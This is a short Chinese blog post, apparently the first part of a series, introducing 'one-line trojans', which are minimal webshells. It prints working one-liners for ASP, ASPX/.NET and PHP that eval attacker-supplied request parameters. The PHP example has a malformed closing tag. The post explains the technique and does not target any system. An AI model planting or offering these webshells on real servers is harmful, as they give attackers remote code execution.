[ PHP - Webshell ] 一句話木馬（上？）
PHP, Webshell

我們常看到人家說一句話木馬，那到底是什麼東西呢？
其實這東西的原型只是一個可以去執行 system call 或去接收惡意 User 傳內容的一個 function 罷了
當然啦，依照各種語言，其實都會有這種 function
例如 :

ASP 

 
<%execute request("vbs")%>

ASPX 

 
<%@ Page Language="Jscript"%><%eval(Request.Item["pass"],"unsafe");%>

.NET 

 
<%@ Page Language="Jscript"%><%Response.Write(eval(Request.Item["z"],"unsafe"));%>

為什麼都是用 ASP 系列當範例?
我才不會跟你講，是因為我討厭 asp 呢

(咳) 好啦，講正題
我們來講 PHP
在 PHP 裡的一句話原型可能是這樣的 

 
<?php eval($_GET[cmd]);>
